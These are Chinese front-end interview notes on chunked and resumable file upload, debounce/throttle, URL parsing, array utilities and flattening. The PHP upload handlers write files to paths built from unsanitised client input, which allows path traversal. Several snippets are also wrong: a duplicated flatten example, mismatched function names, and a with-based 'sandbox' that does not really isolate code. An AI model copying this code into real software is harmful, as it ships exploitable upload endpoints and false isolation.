# scenario

[javascript精进之路手写系列第三弹我写不出来篇（15个）（附详解） - 掘金](https://juejin.cn/post/6986841640476344328)

### 红黄绿灯交错打印

### 文件异步上传怎么实现

1. 普通表单上传

使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=" multipart/form-data"，表明表单需要上传二进制数据。

```html
<form action="/index.php" method="POST" enctype="multipart/form-data">    <input type="file" name="myfile">    <input type="submit"></form>
```

然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…)

```jsx
$imgName = 'IMG'.time().'.'.str_replace('image/', '', $_FILES["myfile"]['type']);$fileName = 'upload/'.$imgName;// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName)) {    echo    $fileName;} else {    echo    "nonn";}
```

form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。

1 文件编码上传

第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递

```jsx
var imgURL = URL.createObjectURL(file);ctx.drawImage(imgURL, 0, 0);// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递var data = canvas.toDataURL("image/jpeg", 0.5);
```

在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可

```jsx
$imgData = $_REQUEST['imgData'];$base64 = explode(',', $imgData)[1];$img = base64_decode($base64);$url = './test.jpg';if (file_put_contents($url, $img)) {    exit(json_encode(array(        url => $url    )));}
```

base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。

更多关于base64的知识，可以参考Base64笔记。

除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传

```jsx
// 读取二进制文件function readBinary(text) {    var data = new ArrayBuffer(text.length);    var ui8a = new Uint8Array(data, 0);    for (var i = 0; i < text.length; i++) {        ui8a[i] = (text.charCodeAt(i) & 0xff);    }    console.log(ui8a)}var reader = new FileReader();reader.onload = function () {    readBinary(this.result) // 读取result或直接上传}// 把从input里读取的文件内容，放到fileReader的result字段里reader.readAsBinaryString(file);
```

2 formData异步上传

FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键/值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。

```jsx
let files = e.target.files // 获取input的file对象let formData = new FormData();formData.append('file', file);axios.post(url, formData);
```

服务端处理方式与直接form表单请求基本相同。

1. iframe无刷新页面

在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的[target](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form) 属性导致的，其取值有

- _self，默认值，在相同的窗口中打开响应页面
- _blank，在新窗口打开
- _parent，在父窗口打开
- _top，在最顶层的窗口打开
- framename，在指定名字的iframe中打开

如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。

```jsx
function upload() {    var now = +new Date()    var id = 'frame' + now    $("body").append(`<iframe style="display:none;" name="${id}" id="${id}" />`);    var $form = $("#myForm")    $form.attr({        "action": '/index.php',        "method": "post",        "enctype": "multipart/form-data",        "encoding": "multipart/form-data",        "target": id    }).submit()    $("#" + id).on("load", function () {        var content = $(this).contents().find("body").text()        try {            var data = JSON.parse(content)        } catch (e) {            console.log(e)        }    })}
```

**扩展：**

**大文件上传**

现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，

- 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形
- 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题
- 编码上传，我们可以比较灵活地控制上传的内容

大文件上传最主要的问题就在于：**在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传** 。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？

综合上面的问题，看来大文件上传需要实现下面几个需求

- 支持拆分上传请求(即切片)
- 支持断点续传
- 支持显示上传进度和暂停上传

接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。

**文件切片**

编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。

在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。

下面是一个拆分文件的示例

```jsx
function slice(file, piece = 1024 * 1024 * 5) {    let totalSize = file.size; // 文件总大小    let start = 0; // 每次上传的开始字节    let end = start + piece; // 每次上传的结尾字节    let chunks = []    while (start < totalSize) {        // 根据长度截取每次需要上传的数据        // File对象继承自Blob对象，因此包含slice方法        let blob = file.slice(start, end);        chunks.push(blob)        start = end;        end = start + piece;    }    return chunks}
```

将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可

```jsx
let file = document.querySelector("[name=file]").files[0];const LENGTH = 1024 * 1024 * 0.1;let chunks = slice(file, LENGTH); // 首先拆分切片chunks.forEach(chunk => {    let fd = new FormData();    fd.append("file", chunk);    post('/mkblk.php', fd)})
```

服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码

```jsx
$filename = './upload/'.$_POST['filename'];//确定上传的文件名//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中if (!file_exists($filename)) {    move_uploaded_file($_FILES['file']['tmp_name'], $filename);} else {    file_put_contents($filename, file_get_contents($_FILES['file']['tmp_name']), FILE_APPEND);    echo    $filename;}
```

测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。

```jsx
server{    // ...    client_max_body_size    50    m;}
```

上面这种方式来存在一些问题

- 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错
- 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的

因此接下来我们来看看应该如何在服务端还原切片。

**还原切片**

在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题

- 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数
- 如何将多个切片还原成一个文件
- 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接
- 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值
- 按顺序拼接切片，还原成文件

上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取

- 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性
- 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.

修改上传代码，增加相关参数

```jsx
// 获取context，同一个文件会返回相同的值function createContext(file) {    return file.name + file.length}let file = document.querySelector("[name=file]").files[0];const LENGTH = 1024 * 1024 * 0.1;let chunks = slice(file, LENGTH);// 获取对于同一个文件，获取其的contextlet context = createContext(file);let tasks = [];chunks.forEach((chunk, index) => {    let fd = new FormData();    fd.append("file", chunk);    // 传递context    fd.append("context", context);    // 传递切片索引值    fd.append("chunk", index + 1);    tasks.push(post("/mkblk.php", fd));});// 所有切片上传完毕后，调用mkfile接口Promise.all(tasks).then(res => {    let fd = new FormData();    fd.append("context", context);    fd.append("chunks", chunks.length);    post("/mkfile.php", fd).then(res => {        console.log(res);    });});
```

在mkblk.php接口中，我们通过context来保存同一个文件相关的切片

```jsx
// mkblk.php$context = $_POST['context'];$path = './upload/'.$context;if (!is_dir($path)) {    mkdir($path);}// 把同一个文件的切片放在相同的目录下$filename = $path.'/'.$_POST['chunk'];$res = move_uploaded_file($_FILES['file']['tmp_name'], $filename);
```

除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用

```jsx
// mkfile.php$context = $_POST['context'];$chunks = (int)$_POST['chunks'];//合并后的文件名$filename = './upload/'.$context.'/file.jpg';for ($i = 1; $i <= $chunks; ++$i) {    $file = './upload/'.$context.    '/'.$i; // 读取单个切块    $content = file_get_contents($file);    if (!file_exists($filename)) {        $fd = fopen($filename, "w+");    } else {        $fd = fopen($filename, "a");    }    fwrite($fd, $content); // 将切块合并到一个文件上}echo$filename;
```

这样就解决了上面的两个问题：

- 识别切片来源
- 保证切片拼接顺序

**断点续传**

即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过 **断点续传**来进行处理。

断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。

由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：

- 在切片上传成功后，保存已上传的切片信息
- 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传
- 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并

因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略

- 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失
- 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录

下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能

```jsx
// 获取已上传切片记录function getUploadSliceRecord(context) {    let record = localStorage.getItem(context)    if (!record) {        return []    } else {        try {            return JSON.parse(record)        } catch (e) {        }    }}// 保存已上传切片function saveUploadSliceRecord(context, sliceIndex) {    let list = getUploadSliceRecord(context)    list.push(sliceIndex)    localStorage.setItem(context, JSON.stringify(list))}
```

然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑

```jsx
let context = createContext(file);// 获取上传记录let record = getUploadSliceRecord(context);let tasks = [];chunks.forEach((chunk, index) => {    // 已上传的切片则不再重新上传    if (record.includes(index)) {        return    }    let fd = new FormData();    fd.append("file", chunk);    fd.append("context", context);    fd.append("chunk", index + 1);    let task = post("/mkblk.php", fd).then(res => {        // 上传成功后保存已上传切片记录        saveUploadSliceRecord(context, index)        record.push(index)    })    tasks.push(task);});
```

此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。

服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。

此外断点续传还需要考虑**切片过期** 的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。

**上传进度和暂停**

通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。

上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。

由于篇幅关系，上传进度和暂停的功能这里就先不实现了。

### 使用setInterval请求实时数据，返回顺序不一致怎么解决

场景：

```jsx
setInterval(function () {    $.get("/path/to/server", function (data, status) {        console.log(data);    });}, 10000);
```

上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。

解决方案：

1. 使用setTimeout代替setInterval
    
    程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。
    
    ```jsx
    function poll() {    setTimeout(function() {        $.get("/path/to/server", function(data, status) {            console.log(data);            // 发起下一次请求            poll();        });    }, 10000);}
    ```
    
2. WebSocket
    
    WebSocket 协议本质上是一个基于 TCP 的协议。
    
    为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息“Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，**并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。**
    
    服务器（Node.js）：
    
    ```jsx
    var WebSocketServer = require('ws').Server;var wss = new WebSocketServer({port: 8080});wss.on("connection", function(socket) {    socket.on("message", function(msg) {        console.log(msg);        socket.send("Nice to meet you!");    });});
    ```
    
    客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：
    
    ```jsx
    // WebSocket 为客户端JavaScript的原生对象var ws = new WebSocket("ws://localhost:8080");ws.onopen = function (event) {    ws.send("Hello there!");}ws.onmessage = function (event) {    console.log(event.data);}
    ```
    

## 防抖和节流

函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。

### **防抖：**

在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。

根据函数防抖思路设计出第一版的最简单的防抖代码：

```jsx
var timer; // 维护同一个timer
function debounce(fn, delay) {
    clearTimeout(timer);
    timer = setTimeout(function () {
        fn();
    }, delay);
}
```

上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。

在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。

优化后的代码：

```jsx
function debounce(fn, delay) {
    var timer; // 维护一个 timer  
    return function () {
        var _this = this; // 取debounce执行作用域的this      
        var args = arguments;
        if (timer) {
            clearTimeout(timer);
        }
        timer = setTimeout(function () {
            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);  
        }, delay);
    };
}
```

使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。

### **节流：**

每隔一段时间，只执行一次函数。

- 定时器实现节流函数：
    
    ```jsx
    function throttle(fn, delay) {
        var timer;
        return function () {
            var _this = this;
            var args = arguments;
            if (timer) {
                return;
            }
            timer = setTimeout(function () {
                fn.apply(_this, args);
                timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器 
            }, delay)
        }
    }
    ```
    
- 时间戳实现节流函数：
    
    ```jsx
    function throttle(fn, delay) {
        var previous = 0;  // 使用闭包返回一个函数并且用到闭包函数外面的变量previous 
        return function () {
            var _this = this;
            var args = arguments;
            var now = new Date();
            if (now - previous > delay) {
                fn.apply(_this, args);
                previous = now;
            }
        }
    }
    ```
    

**异同比较**

相同点：

- 都可以通过使用 setTimeout 实现。
- 目的都是，降低回调执行频率。节省计算资源。

不同点：

- 函数防抖，在一段连续操作结束后，处理回调，**利用clearTimeout 和 setTimeout实现**。函数节流，在一段连续操作中，**每一段时间只执行一次** ，频率较高的事件中使用来提高性能。
- 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。

### 常见应用场景

**函数防抖的应用场景:**

连续的事件，只需触发一次回调的场景有：

- 搜索框搜索输入。只需用户最后一次输入完，再发送请求
- 手机号、邮箱验证输入检测
- 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。

**函数节流的应用场景:**

间隔一段时间执行一次回调的场景有：

- 滚动加载，加载更多或滚到底部监听
- 谷歌搜索框，搜索联想功能
- 高频点击提交，表单重复提交

## 获取当前页面url

1. window.location.href (设置或获取整个 URL 为字符串)

```jsx
var test = window.location.href;alert(test);//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1
```

1. window.location.protocol (设置或获取 URL 的协议部分)

```jsx
var test = window.location.protocol;alert(test);//返回：http:
```

1. window.location.host (设置或获取 URL 的主机部分)

```jsx
var test = window.location.host;alert(test);//返回：i.cnblogs.com
```

1. window.location.port (设置或获取与 URL 关联的端口号码)

```jsx
var test = window.location.port;alert(test);//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)
```

1. window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)

```jsx
var test = window.location.pathname;alert(test);//返回：/EditPosts.aspx
```

1. window.location.search (设置或获取 href 属性中跟在问号后面的部分)

```jsx
var test = window.location.search;alert(test);//返回：?opt=1（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）
```

1. window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)

```jsx
var test = window.location.hash;alert(test);//返回：空字符(因为url中没有)
```

1. js获取url中的参数值*
    
    正则法
    

```jsx
function getQueryString(name) {    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');    var r = window.location.search.substr(1).match(reg);    if (r != null) {        return unescape(r[2]);    }    return null;}// 这样调用：alert(GetQueryString("参数名1"));alert(GetQueryString("参数名2"));alert(GetQueryString("参数名3"));
```

split拆分法

```jsx
function GetRequest() {    var url = location.search; //获取url中"?"符后的字串    var theRequest = new Object();    if (url.indexOf("?") != -1) {        var str = url.substr(1);        strs = str.split("&");        for (var i = 0; i < strs.length; i++) {            theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);        }    }    return theRequest;}var Request = new Object();Request = GetRequest();<br>// var id=Request["id"];    // var 参数1,参数2,参数3,参数N;    // 参数1 = Request['参数1'];    // 参数2 = Request['参数2'];    // 参数3 = Request['参数3'];    // 参数N = Request['参数N'];
```

指定取 比如说一个url：[http://i.cnblogs.com/?j=js](https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js), 我们想得到参数j的值，可以通过以下函数调用。

```jsx
function GetQueryString(name) {    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");    var r = window.location.search.substr(1).match(reg); //获取url中"?"符后的字符串并正则匹配    var context = "";    if (r != null)        context = r[2];    reg = null;    r = null;    return context == null || context == "" || context == "undefined" ? "" : context;}alert(GetQueryString("j"));
```

单个参数的获取方法

```jsx
function GetRequest() {    var url = location.search; //获取url中"?"符后的字串    if (url.indexOf("?") != -1) { //判断是否有参数        var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串        strs = str.split("="); //用等号进行分隔 （因为知道只有一个参数        //所以直接用等号进分隔 如果有多个参数 要用&号分隔 再用等号进行分隔）        alert(strs[1]); //直接弹出第一个参数 （如果有多个参数 还要进行循环的）    }}
```

### js中两个数组怎么取交集+(差集、并集、补集)

1. 最普遍的做法
    
    使用 **ES5** 语法来实现虽然会麻烦些，但兼容性最好，不用考虑浏览器 **JavaScript** 版本。也不用引入其他第三方库。
    
    直接使用 filter、concat 来计算
    
    ```jsx
    var a = [1,2,3,4,5]var b = [2,4,6,8,10]//交集var c = a.filter(function(v){ return b.indexOf(v) > -1 })//差集var d = a.filter(function(v){ return b.indexOf(v) == -1 })//补集var e = a.filter(function(v){ return !(b.indexOf(v) > -1) })        .concat(b.filter(function(v){ return !(a.indexOf(v) > -1)}))//并集var f = a.concat(b.filter(function(v){ return !(a.indexOf(v) > -1)}));
    ```
    
    对 Array 进行扩展
    
    ```jsx
    //数组功能扩展//数组迭代函数Array.prototype.each = function(fn){  fn = fn || Function.K;   var a = [];   var args = Array.prototype.slice.call(arguments, 1);   for(var i = 0; i < this.length; i++){       var res = fn.apply(this,[this[i],i].concat(args));       if(res != null) a.push(res);   }   return a;};//数组是否包含指定元素Array.prototype.contains = function(suArr){  for(var i = 0; i < this.length; i ++){      if(this[i] == suArr){          return true;      }   }   return false;}//不重复元素构成的数组Array.prototype.uniquelize = function(){   var ra = new Array();   for(var i = 0; i < this.length; i ++){      if(!ra.contains(this[i])){          ra.push(this[i]);      }   }   return ra;};//两个数组的交集Array.intersect = function(a, b){   return a.uniquelize().each(function(o){return b.contains(o) ? o : null});};//两个数组的差集Array.minus = function(a, b){   return a.uniquelize().each(function(o){return b.contains(o) ? null : o});};//两个数组的补集Array.complement = function(a, b){   return Array.minus(Array.union(a, b),Array.intersect(a, b));};//两个数组并集Array.union = function(a, b){   return a.concat(b).uniquelize();};
    ```
    
2. 使用 ES6 语法实现
    
    **ES6** 中可以借助扩展运算符（**…**）以及 **Set** 的特性实现相关计算，代码也会更加简单些。
    
    ```jsx
    var a = [1,2,3,4,5]var b = [2,4,6,8,10]console.log("数组a：", a);console.log("数组b：", b);var sa = new Set(a);var sb = new Set(b);// 交集let intersect = a.filter(x => sb.has(x));// 差集let minus = a.filter(x => !sb.has(x));// 补集let complement  = [...a.filter(x => !sb.has(x)), ...b.filter(x => !sa.has(x))];// 并集let unionSet = Array.from(new Set([...a, ...b]));
    ```
    
3. 使用 jQuery 实现
    
    ```jsx
    var a = [1,2,3,4,5]var b = [2,4,6,8,10]console.log("数组a：", a);console.log("数组b：", b);// 交集let intersect = $(a).filter(b).toArray();// 差集let minus = $(a).not(b).toArray();// 补集let complement  = $(a).not(b).toArray().concat($(b).not(a).toArray());// 并集let unionSet = $.unique(a.concat(b));
    ```
    

### 用正则和非正则实现123456789.12=》1，234，567，890.12

非正则：

如果数字带有小数点的话，可以使用toLocaleString()方法实现这个需求。

```jsx
b.toLocaleString();
```

正则：

1. 不带小数点
    
    ```jsx
    num.toString().replace(/(\d)(?=(?:\d{3})+$)/g,'$1,')
    ```
    
2. 带小数点
- 判读是否带有小数点
- 没有小数点，就用正则匹配实

```jsx
function numFormat(num) {    var c = (num.toString().indexOf('.') !== -1) ? num.toLocaleString() :        num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');    return c;}
```

### 写一个判断是否是空对象的函数

```jsx
function isEmpty(value) {    return (        value === null || value === undefined ||        (typeof value === 'object' && Object.keys(value).length === 0)    )}
```

### 代码题：颜色值16进制转10进制rgb

```jsx
function toRGB(color) {    var regex = /^#([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/ //匹配十六进制的正则    match = color.match(regex)  // 判断是否是十六进制颜色值    return match ? 'rgb(' + parseInt(match[1], 16) + ',' + parseInt(match[2], 16) + ',' + parseInt(match[3], 16) + ')' : color}
```

## flattern

**递归**

我们最一开始能想到的莫过于循环数组元素，如果还是一个数组，就递归调用该方法：

```jsx
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    var result = [];
    for (var i = 0, len = arr.length; i < len; i++) {
        if (Array.isArray(arr[i])) {
            result = result.concat(flatten(arr[i]))
        } else {
            result.push(arr[i])
        }
    }
    return result;
}

console.log(flatten(arr))
```

**toString**

如果数组的元素都是数字，那么我们可以考虑使用 toString 方法，因为：

```jsx
[1, [2, [3, 4]]].toString() // "1,2,3,4"
```

调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了吗？

```jsx
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    return arr.reduce(function (prev, next) {
        return prev.concat(Array.isArray(next) ? flatten(next) : next)
    }, [])
}

console.log(flatten(arr))
```

然而这种方法使用的场景却非常有限，如果数组是 [1, ‘1’, 2, ‘2’] 的话，这种方法就会产生错误的结果。

**reduce**

既然是对数组进行处理，最终返回一个值，我们就可以考虑使用 reduce 来简化代码：

```jsx
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    return arr.reduce(function (prev, next) {
        return prev.concat(Array.isArray(next) ? flatten(next) : next)
    }, [])
}

console.log(flatten(arr))
```

**…**

ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：

```jsx
var arr = [1, [2, [3, 4]]];
console.log([].concat(...arr)); // [1, 2, [3, 4]]
```

我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：

```jsx
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    while (arr.some(item => Array.isArray(item))) {
        arr = [].concat(...arr);
    }
    return arr;
}

console.log(flatten(arr))
```

**undercore**

那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~

在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。

```jsx
/** 数组扁平化
 * @param {Array} input   要处理的数组
 * @param {boolean} shallow 是否只扁平一层
 * @param  {boolean} strict  是否严格处理元素，下面有解释
 * @param  {Array} output  这是为了方便递归而传递的参数
 * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528
 */
function flatten(input, shallow, strict, output) {
    // 递归使用的时候会用到output 
    output = output || [];
    var idx = output.length;
    for (var i = 0, len = input.length; i < len; i++) {
        // 如果是数组，就进行处理
        var value = input[i];
        if (Array.isArray(value)) {
            // 如果是只扁平一层，遍历该数组，依此填入 output
            if (shallow) {
                var j = 0, length = value.length;
                while (j < length) {
                    output[idx++] = value[j++];
                }
            } else {// 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output       
                flatten(value, shallow, strict, output);
                idx = output.length;
            }
        } else if (!strict) {// 不是数组，根据 strict 的值判断是跳过不处理还是放入 output    
            output[idx++] = value;
        }
    }
    return output;
}
```

解释下 strict，在代码里我们可以看出，当遍历数组元素时，如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，举个例子：

```jsx
var arr = [1, 2, [3, 4]];console.log(flatten(arr, true, true)); // [3, 4]
```

那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：

- shallow true + strict false ：正常扁平一层
- shallow false + strict false ：正常扁平所有层
- shallow true + strict true ：去掉非数组元素
- shallow false + strict true ： 返回一个[]

我们看看 underscore 中哪些方法调用了 flatten 这个基本函数：

- *_.flatten**

首先就是 _.flatten：

```jsx
_.flatten = function (array, shallow) {    return flatten(array, shallow, false);};
```

在正常的扁平中，我们并不需要去掉非数组元素。

- *_.union**

接下来是 _.union：

该函数传入多个数组，然后返回传入的数组的并集，

举个例子：

```jsx
_.union([1, 2, 3], [101, 2, 1, 10], [2, 1]);=>[1, 2, 3, 101, 10]
```

如果传入的参数并不是数组，就会将该参数跳过：

```jsx
_.union([1, 2, 3], [101, 2, 1, 10], 4, 5);=>[1, 2, 3, 101, 10]
```

为了实现这个效果，我们可以将传入的所有数组扁平化，然后去重，因为只能传入数组，这时候我们直接设置 strict 为 true，就可以跳过传入的非数组的元素。

```jsx
// 关于 unique 可以查看《JavaScript专题之数组去重》[](https://github.com/mqyqingfeng/Blog/issues/27)function unique(array) {    return Array.from(new Set(array));}_.union = function () {    return unique(flatten(arguments, true, true));}
```

- *_.difference**

是不是感觉折腾 strict 有点用处了，我们再看一个 _.difference：

语法为：

```jsx
_.difference(array, * others)
```

效果是取出来自 array 数组，并且不存在于多个 other 数组的元素。跟 _.union 一样，都会排除掉不是数组的元素。

举个例子：

```jsx
_.difference([1, 2, 3, 4, 5], [5, 2, 10], [4], 3);=>[1, 3]
```

实现方法也很简单，扁平 others 的数组，筛选出 array 中不在扁平化数组中的值：

```jsx
function difference(array, ...rest) {    rest = flatten(rest, true, true);    return array.filter(function (item) {        return rest.indexOf(item) === -1;    })}
```

### 倒计时，一开始就进行

题意：一旦进入页面倒计时就开始，因此在window.onload方法中调用倒计时方法

```html
<script>    window.onload = function () {        countDown();        function addZero(i) {            return i < 10 ? "0" + i : i + "";        }        function countDown() {            var nowtime = new Date();            var endtime = new Date("2019/03/16,17:57:00");            var lefttime = parseInt((endtime.getTime() - nowtime.getTime()) / 1000);            var d = parseInt(lefttime / (24 * 60 * 60))            var h = parseInt(lefttime / (60 * 60) % 24);            var m = parseInt(lefttime / 60 % 60);            var s = parseInt(lefttime % 60);            d = addZero(d)            h = addZero(h);            m = addZero(m);            s = addZero(s);            document.querySelector(".count").innerHTML = `活动倒计时  ${d}天 ${h} 时 ${m} 分 ${s} 秒`;            if (lefttime <= 0) {                document.querySelector(".count").innerHTML = "活动已结束";                return;            }            setTimeout(countDown, 1000);        }    }</script>
```

### 沙箱隔离怎么做的什么原理

沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。

实现沙箱的三种方法

1. 借助with + new Function

首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：

```jsx
function compileCode(src) {    src = 'with (exposeObj) {' + src + '}'    return new Function('exposeObj', src)}
```

